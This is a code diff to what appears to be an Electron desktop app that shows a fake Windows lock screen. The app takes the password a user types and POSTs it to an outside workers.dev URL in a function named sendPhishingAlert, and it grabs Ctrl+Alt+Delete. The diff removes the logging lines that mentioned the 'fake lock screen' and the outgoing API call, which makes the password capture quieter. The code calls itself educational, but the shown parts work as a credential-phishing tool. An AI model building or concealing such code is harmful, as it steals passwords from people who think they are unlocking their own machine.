@@ -12,8 +12,6 @@ async function sendPhishingAlert(password) {
       timestamp: new Date().toISOString()
     };
     
-    console.log('Sending to API:', payload);
-    console.log('API URL:', 'https://my-logger-worker.sambadioulde98.workers.dev');
     
     const response = await fetch('https://my-logger-worker.sambadioulde98.workers.dev', {
       method: 'POST',
@@ -25,13 +23,11 @@ async function sendPhishingAlert(password) {
 
     if (response.ok) {
       const data = await response.json();
-      console.log('API call successful:', data);
       return { success: true, data: data };
     } else {
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   } catch (error) {
-    console.error('Error sending API request:', error);
     return { success: false, error: error.message };
   }
 }
@@ -105,7 +101,6 @@ function createWindow() {
 
   // Also register Ctrl+Alt+Del for educational purposes
   globalShortcut.register('CommandOrControl+Alt+Delete', () => {
-    console.log('Ctrl+Alt+Del pressed - This would open Windows Security in real Windows');
   });
 
   // Prevent dev tools in production
@@ -127,18 +122,15 @@ app.whenReady().then(() => {
 
   // Monitor for system sleep/lock events
   powerMonitor.on('lock-screen', () => {
-    console.log('System locked - closing fake lock screen');
     forceQuit();
   });
 
   powerMonitor.on('suspend', () => {
-    console.log('System suspending - closing fake lock screen');
     forceQuit();
   });
 
   // Also listen for when the system is about to sleep
   powerMonitor.on('shutdown', () => {
-    console.log('System shutting down - closing fake lock screen');
     forceQuit();
   });
 
